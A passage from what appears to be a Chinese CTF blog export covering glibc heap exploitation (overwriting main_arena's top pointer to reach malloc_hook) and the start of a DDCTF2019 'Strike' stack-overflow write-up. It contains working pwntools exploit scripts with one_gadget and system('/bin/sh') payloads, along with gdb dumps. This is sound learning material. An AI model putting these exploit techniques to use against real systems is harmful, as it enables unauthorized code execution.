class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Bitmap of bins, help to speed up the process of determinating if a given bin is definitely empty.*/</span></span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> binmap[ BINMAPSIZE ];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Linked list, points to the next arena */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_state</span> *<span class=\"title\">next</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class=\"line\"><span class=\"comment\">       by free_list_lock in arena.c.  */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_state</span> *<span class=\"title\">next_free</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class=\"line\"><span class=\"comment\">       the free list.  Access to this field is serialized by</span></span><br><span class=\"line\"><span class=\"comment\">       free_list_lock in arena.c.  */</span></span><br><span class=\"line\">    INTERNAL_SIZE_T attached_threads;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Memory allocated from the system in this arena.  */</span></span><br><span class=\"line\">    INTERNAL_SIZE_T system_mem;</span><br><span class=\"line\">    INTERNAL_SIZE_T max_system_mem;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>gdb调试：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  x/32gx 0x7f81fbc89b20</span><br><span class=\"line\">0x7f81fbc89b20 &lt;main_arena&gt;:\t0x0000000100000000\t0x0000000000000000</span><br><span class=\"line\">0x7f81fbc89b30 &lt;main_arena+16&gt;:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x7f81fbc89b40 &lt;main_arena+32&gt;:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x7f81fbc89b50 &lt;main_arena+48&gt;:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x7f81fbc89b60 &lt;main_arena+64&gt;:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x7f81fbc89b70 &lt;main_arena+80&gt;:\t0x0000000000000000\t0x0000559b443720e0</span><br><span class=\"line\">0x7f81fbc89b80 &lt;main_arena+96&gt;:\t0x0000559b44372070\t0x0000559b44372070</span><br><span class=\"line\">0x7f81fbc89b90 &lt;main_arena+112&gt;:\t0x0000559b44372070\t0x00007f81fbc89b88</span><br><span class=\"line\">0x7f81fbc89ba0 &lt;main_arena+128&gt;:\t0x00007f81fbc89b88\t0x00007f81fbc89b98</span><br><span class=\"line\"></span><br><span class=\"line\">gef➤  heap chunks</span><br><span class=\"line\">Chunk(addr=0x559b44372010, size=0x20, flags=PREV_INUSE)</span><br><span class=\"line\">    [0x0000559b44372010     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa]</span><br><span class=\"line\">Chunk(addr=0x559b44372030, size=0x50, flags=PREV_INUSE)</span><br><span class=\"line\">    [0x0000559b44372030     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]</span><br><span class=\"line\">Chunk(addr=0x559b44372080, size=0x50, flags=PREV_INUSE)</span><br><span class=\"line\">    [0x0000559b44372080     78 9b c8 fb 81 7f 00 00 78 9b c8 fb 81 7f 00 00    x.......x.......]</span><br><span class=\"line\">Chunk(addr=0x559b443720d0, size=0x20, flags=)</span><br><span class=\"line\">    [0x0000559b443720d0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]</span><br><span class=\"line\">Chunk(addr=0x559b443720f0, size=0x20f20, flags=PREV_INUSE)  ←  top chunk</span><br></pre></td></tr></table></figure>\n<p>所以main_arena + 88处存储的是top chunk的地址，尝试在这个地址前找一个合适的偏移。但是前面都是fastbin数组存储的fd指针，如果fastbin链表中没有chunk的话，就不可能有合适的偏移地址。所以要首先向fastbin 填充一些chunk的地址，这里有个trick，一般来说堆地址是0x55开头的（有时候是0x56），所以我们用fastbin在main_arena占位后，找到一个合适的偏移，使得size为0x55(0x56)，然后malloc(0x40)即可。这里是根据<code>(0x55 &gt;&gt; 4) - 2 =  4</code>计算得到chunk在fastbin中的下标。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  x/32gx 0x7f4b01358b78-0x58 + 0x20 + 5</span><br><span class=\"line\">0x7f4b01358b45 &lt;main_arena+37&gt;:\t0xad249d50e0000000\t0x0000000000000055</span><br><span class=\"line\">0x7f4b01358b55 &lt;main_arena+53&gt;:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x7f4b01358b65 &lt;main_arena+69&gt;:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x7f4b01358b75 &lt;main_arena+85&gt;:\t0xad249d5140000000\t0xad249d5070000055</span><br><span class=\"line\">0x7f4b01358b85 &lt;main_arena+101&gt;:\t0x4b01358b78000055\t0x4b01358b7800007f</span><br></pre></td></tr></table></figure>\n<p>可以看到，当分配到main_arena+0x20+5时，size为0x55，然后就可以覆盖top chunk或者last remainder了。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  heap bins</span><br><span class=\"line\">[+] No Tcache in this version of libc</span><br><span class=\"line\">────────────────────── Fastbins for arena 0x7fedf8a74b20 ──────────────────────</span><br><span class=\"line\">Fastbins[idx=0, size=0x10] 0x00</span><br><span class=\"line\">Fastbins[idx=1, size=0x20] 0x00</span><br><span class=\"line\">Fastbins[idx=2, size=0x30] 0x00</span><br><span class=\"line\">Fastbins[idx=3, size=0x40]  ←  Chunk(addr=0x55f94d040080, size=0x50, flags=PREV_INUSE)  ←  Chunk(addr=0x7fedf8a74b55, size=0x50, flags=PREV_INUSE|NON_MAIN_ARENA) </span><br><span class=\"line\">Fastbins[idx=4, size=0x50]  ←  Chunk(addr=0x55f94d0400f0, size=0x60, flags=PREV_INUSE) </span><br><span class=\"line\">Fastbins[idx=5, size=0x60] 0x00</span><br><span class=\"line\">Fastbins[idx=6, size=0x70] 0x00</span><br></pre></td></tr></table></figure>\n<p>​    当成功修改top指针后，再次malloc，会从top指针处开始任意分配，这时分配到malloc_hook之前即可，但仍然需要绕过对size的检查，所以我们令top chunk指向main_arena - 0x33的地址。</p>\n<p>​    </p>\n<p>​    但是，该题利用成功率不是百分之百，有一定几率失败。</p>\n<h3 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/x86_64-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./babyheap\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./babyheap\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">allocate</span><span class=\"params\">(size)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Command: \"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Size: \"</span>)</span><br><span class=\"line\">\tp.sendline(str(size))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">update</span><span class=\"params\">(index, size, content)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Command: \"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Index: \"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Size: \"</span>)</span><br><span class=\"line\">\tp.sendline(str(size))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Content: \"</span>)</span><br><span class=\"line\">\tp.send(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">view</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Command: \"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"4\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Index: \"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Command: \"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Index: \"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># leak libc</span></span><br><span class=\"line\">allocate(<span class=\"number\">0x18</span>) <span class=\"comment\"># 0 </span></span><br><span class=\"line\">allocate(<span class=\"number\">0x40</span>) <span class=\"comment\"># 1</span></span><br><span class=\"line\">allocate(<span class=\"number\">0x40</span>) <span class=\"comment\"># 2</span></span><br><span class=\"line\">allocate(<span class=\"number\">0x10</span>) <span class=\"comment\"># 3</span></span><br><span class=\"line\">payload = <span class=\"number\">0x18</span> * <span class=\"string\">\"a\"</span> + <span class=\"string\">\"\\xa1\"</span></span><br><span class=\"line\">update(<span class=\"number\">0</span>, len(payload), payload)</span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">allocate(<span class=\"number\">0x40</span>) <span class=\"comment\"># 1</span></span><br><span class=\"line\">view(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">addr = u64(p.recvuntil(<span class=\"string\">\"\\x7f\"</span>)[<span class=\"number\">-6</span>:].ljust(<span class=\"number\">8</span>, <span class=\"string\">\"\\x00\"</span>))</span><br><span class=\"line\">libc.address = addr - <span class=\"number\">0x3c4b78</span></span><br><span class=\"line\">main_arena = addr - <span class=\"number\">0x58</span></span><br><span class=\"line\">one_gadget = libc.address + <span class=\"number\">0x4526a</span> <span class=\"comment\"># f1147 4526a</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> hex(addr)</span><br><span class=\"line\"></span><br><span class=\"line\">chunk_addr = main_arena + <span class=\"number\">0x20</span> + <span class=\"number\">5</span></span><br><span class=\"line\">fake_addr = main_arena - <span class=\"number\">0x33</span></span><br><span class=\"line\">allocate(<span class=\"number\">0x40</span>) <span class=\"comment\"># 4</span></span><br><span class=\"line\">delete(<span class=\"number\">2</span>) <span class=\"comment\"># use 4 to write to truly 2</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">allocate(<span class=\"number\">0x58</span>) <span class=\"comment\"># 2 </span></span><br><span class=\"line\">delete(<span class=\"number\">2</span>) <span class=\"comment\"># 2</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = p64(chunk_addr) + p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">update(<span class=\"number\">4</span>,len(payload), payload) <span class=\"comment\"># change fd of truly idx2</span></span><br><span class=\"line\"></span><br><span class=\"line\">allocate(<span class=\"number\">0x40</span>) <span class=\"comment\"># 2</span></span><br><span class=\"line\">allocate(<span class=\"number\">0x40</span>) <span class=\"comment\"># 5 at main_arena</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = (<span class=\"number\">0x58</span> - <span class=\"number\">0x30</span> - <span class=\"number\">5</span>) * <span class=\"string\">\"\\x00\"</span></span><br><span class=\"line\">payload += p64(fake_addr)</span><br><span class=\"line\">update(<span class=\"number\">5</span>, len(payload), payload)</span><br><span class=\"line\"></span><br><span class=\"line\">allocate(<span class=\"number\">0x48</span>) <span class=\"comment\"># 6</span></span><br><span class=\"line\">payload = <span class=\"number\">0x13</span> * <span class=\"string\">\"a\"</span></span><br><span class=\"line\">payload += p64(one_gadget)</span><br><span class=\"line\">update(<span class=\"number\">6</span>, len(payload), payload)</span><br><span class=\"line\">allocate(<span class=\"number\">0x10</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h1 id=\"参考链接：\"><a href=\"#参考链接：\" class=\"headerlink\" title=\"参考链接：\"></a>参考链接：</h1><p><a href=\"https://www.anquanke.com/post/id/175630\" target=\"_blank\" rel=\"noopener\">https://www.anquanke.com/post/id/175630</a></p>\n<p><a href=\"http://eternalsakura13.com/2018/04/03/babyheap/\" target=\"_blank\" rel=\"noopener\">http://eternalsakura13.com/2018/04/03/babyheap/</a></p>\n","text":"本文讲一下近期学习的两种围绕Top Chunk做文章的堆利用方法：House of Force和直接修改main_arena中的top指针。House of force（Top chunk劫持）top chunk的分割机制与利用点众所周知，top chunk的作用是作为后备堆空间","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"pwn","slug":"pwn","count":6,"path":"api/tags/pwn.json"}]},{"title":"DDCTF2019-writeup","slug":"DDCTF2019-writeup","date":"2019-04-18T11:41:06.000Z","updated":"2019-04-21T03:09:33.457Z","comments":true,"path":"api/articles/DDCTF2019-writeup.json","excerpt":"","keywords":null,"cover":null,"content":"<p>本次DDCTF2019抱着玩一玩的心态参与了一下，事先不知道Pwn的题目这么少，RE的题目也不算多（主要RE的难题我不会做，简单题又比较水），所以就一开始做了两天，后续没有再尝试，最后排名100多位。下面简单总结一下Pwn和RE几道题的writeup。</p>\n<h1 id=\"Pwn\"><a href=\"#Pwn\" class=\"headerlink\" title=\"Pwn\"></a>Pwn</h1><p>pwn只有一道题目</p>\n<h2 id=\"Strike\"><a href=\"#Strike\" class=\"headerlink\" title=\"Strike\"></a>Strike</h2><p>该题目提供了libc，防护如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/DDCTF2019$ checksec xpwn </span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/DDCTF2019/xpwn&apos;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n<p>未开启canary和PIE，只开启了NX，且为32位，有栈利用的可能。</p>\n<p>简单运行程序发现程序首先要求输入用户名，然后在打印用户名的时候会出现一些不可见字符，这里可能存在信息泄漏漏洞。之后要求输入密码的长度，再输入密码。用IDA简单查看下：</p>\n<p>在向栈上写name时，由于写完就用格式化字符串的%s格式输出，所以只要不输入\\x00，就可以随意leak出栈上的数据。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> __<span class=\"function\">cdecl <span class=\"title\">sub_80485DB</span><span class=\"params\">(FILE *stream, FILE *a2)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> v2; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> buf; <span class=\"comment\">// [esp+0h] [ebp-48h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Enter username: \"</span>);</span><br><span class=\"line\">  v2 = fileno(stream);</span><br><span class=\"line\">  read(v2, &amp;buf, <span class=\"number\">0x40</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">fprintf</span>(a2, <span class=\"string\">\"Hello %s\"</span>, &amp;buf);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>调试可知，我们从ebp-0x48处开始写，而ebp-0x20处为栈地址，ebp-0x24处为libc地址，所以padding 0x48 - 0x20字节可以直接leak处栈地址和libc地址。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  dereference $esp 100</span><br><span class=\"line\">0xffffcf00│+0x0000: 0x00000000\t ← $esp</span><br><span class=\"line\">0xffffcf04│+0x0004: 0xffffcf10  →  0xf7ffd000  →  0x00023f40</span><br><span class=\"line\">0xffffcf08│+0x0008: 0x00000040 (&quot;@&quot;?)</span><br><span class=\"line\">0xffffcf0c│+0x000c: 0xffffcf88  →  0xf7e0bdc8  →  0x00002b76 (&quot;v+&quot;?)</span><br><span class=\"line\">0xffffcf10│+0x0010: 0xf7ffd000  →  0x00023f40  &lt;= 从这里开始写</span><br><span class=\"line\">0xffffcf14│+0x0014: 0x080482c8  →   add BYTE PTR [ecx+ebp*2+0x62], ch</span><br><span class=\"line\">0xffffcf18│+0x0018: 0x08048258  →  0x00000057 (&quot;W&quot;?)</span><br><span class=\"line\">0xffffcf1c│+0x001c: 0x00000000</span><br><span class=\"line\">0xffffcf20│+0x0020: 0xf7ffda74  →  0xf7fd3470  →  0xf7ffd918  →  0x00000000</span><br><span class=\"line\">0xffffcf24│+0x0024: 0xf7e0bcc8  →  0x000029d0</span><br><span class=\"line\">0xffffcf28│+0x0028: 0xf7e5f21b  →  &lt;setbuffer+11&gt; add ebx, 0x151de5</span><br><span class=\"line\">0xffffcf2c│+0x002c: 0x00000000</span><br><span class=\"line\">0xffffcf30│+0x0030: 0xf7fb1000  →  0x001b1db0</span><br><span class=\"line\">0xffffcf34│+0x0034: 0xf7fb1000  →  0x001b1db0</span><br><span class=\"line\">0xffffcf38│+0x0038: 0xffffcfc8  →  0x00000000 &lt;= main函数的ebp地址</span><br><span class=\"line\">0xffffcf3c│+0x003c: 0xf7e65005  →  &lt;setbuf+21&gt; add esp, 0x1c &lt;= libc地址</span><br><span class=\"line\">0xffffcf40│+0x0040: 0xf7fb1d60  →  0xfbad2887</span><br><span class=\"line\">0xffffcf44│+0x0044: 0x00000000</span><br><span class=\"line\">0xffffcf48│+0x0048: 0x00002000</span><br><span class=\"line\">0xffffcf4c│+0x004c: 0xf7e64ff0  →  &lt;setbuf+0&gt; sub esp, 0x10</span><br><span class=\"line\">0xffffcf50│+0x0050: 0xf7fb1d60  →  0xfbad2887</span><br><span class=\"line\">0xffffcf54│+0x0054: 0xf7ffd918  →  0x00000000</span><br><span class=\"line\">0xffffcf58│+0x0058: 0xffffcfc8  →  0x00000000\t ← $ebp</span><br></pre></td></tr></table></figure>\n<p>然后考虑如何劫持控制流。这里注意，虽然在检查长度时会强制转换为有符号数，但是在read函数传参时仍旧把nbytes当作无符号数，所以如果输入负数，就可以绕过长度检查，实现任意长度的栈溢出。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nbytes = read_num();</span><br><span class=\"line\"> <span class=\"keyword\">if</span> ( (<span class=\"keyword\">signed</span> <span class=\"keyword\">int</span>)nbytes &gt; <span class=\"number\">63</span> )</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">   <span class=\"built_in\">puts</span>(<span class=\"string\">\"Too long!\"</span>);</span><br><span class=\"line\">   <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> <span class=\"built_in\">printf</span>(<span class=\"string\">\"Enter password(lenth %u): \"</span>, nbytes);</span><br><span class=\"line\"> v1 = fileno(<span class=\"built_in\">stdin</span>);</span><br><span class=\"line\"> read(v1, &amp;buf, nbytes); &lt;= IO2BO</span><br></pre></td></tr></table></figure>\n<p>但是main函数返回的栈桢操作比较特殊，在main函数返回之前的汇编语句如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:08048735                 mov     eax, 0</span><br><span class=\"line\">.text:0804873A                 lea     esp, [ebp-8]</span><br><span class=\"line\">.text:0804873D                 pop     ecx</span><br><span class=\"line\">.text:0804873E                 pop     ebx</span><br><span class=\"line\">.text:0804873F                 pop     ebp</span><br><span class=\"line\">.text:08048740                 lea     esp, [ecx-4]</span><br><span class=\"line\">.text:08048743                 retn</span><br></pre></td></tr></table></figure>\n<p>首先令esp指向ebp-8处，然后分别pop三次给ecx, ebx和ebp，最后将esp指向ecx-4处，然后retn，也就是将eip转到ecx-4处开始执行代码。所以我们需要在ebp-8处布置栈，令esp和ebp均指向我们构造的栈桢处。直接看exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload = p32(system) <span class=\"comment\"># [ebp - 0x4c]</span></span><br><span class=\"line\">payload += p32(main) <span class=\"comment\"># fake ebp of system [ebp - 0x4c + 4]</span></span><br><span class=\"line\">payload += p32(stack_addr - <span class=\"number\">0x4c</span> + <span class=\"number\">12</span>) <span class=\"comment\"># arg1:the addr of /bin/sh [ebp - 0x4c + 8]</span></span><br><span class=\"line\">payload += <span class=\"string\">\"/bin/sh\\x00\"</span> <span class=\"comment\"># [ebp - 0x4c + 12]</span></span><br><span class=\"line\">payload = payload.ljust(<span class=\"number\">0x4c</span> - <span class=\"number\">0x8</span> , <span class=\"string\">\"a\"</span>) <span class=\"comment\"># padding to [ebp - 8]</span></span><br><span class=\"line\">payload += p32(stack_addr - <span class=\"number\">0x4c</span> + <span class=\"number\">4</span>) <span class=\"comment\"># ecx = target_addr + 4</span></span><br><span class=\"line\">payload += <span class=\"string\">\"aaaa\"</span> <span class=\"comment\"># ebx</span></span><br><span class=\"line\">payload += p32(stack_addr - <span class=\"number\">0x4c</span> + <span class=\"number\">4</span>) <span class=\"comment\"># fake ebp</span></span><br></pre></td></tr></table></figure>\n<p>最终完整的exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./xpwn\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = remote(<span class=\"string\">\"116.85.48.105\"</span>,<span class=\"string\">\"5005\"</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"./libc.so.6\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"username: \"</span>)</span><br><span class=\"line\">payload = <span class=\"number\">10</span> * <span class=\"string\">\"aaaa\"</span></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">stack_addr = u32(p.recvuntil(<span class=\"string\">\"\\xff\"</span>)[<span class=\"number\">-4</span>:])</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"\\xf7\"</span>)</span><br><span class=\"line\">leak = u32(p.recvuntil(<span class=\"string\">\"\\xf7\"</span>)[<span class=\"number\">-4</span>:])</span><br><span class=\"line\">libc.address = leak - libc.symbols[<span class=\"string\">'_IO_2_1_stdout_'</span>]</span><br><span class=\"line\">system = libc.symbols[<span 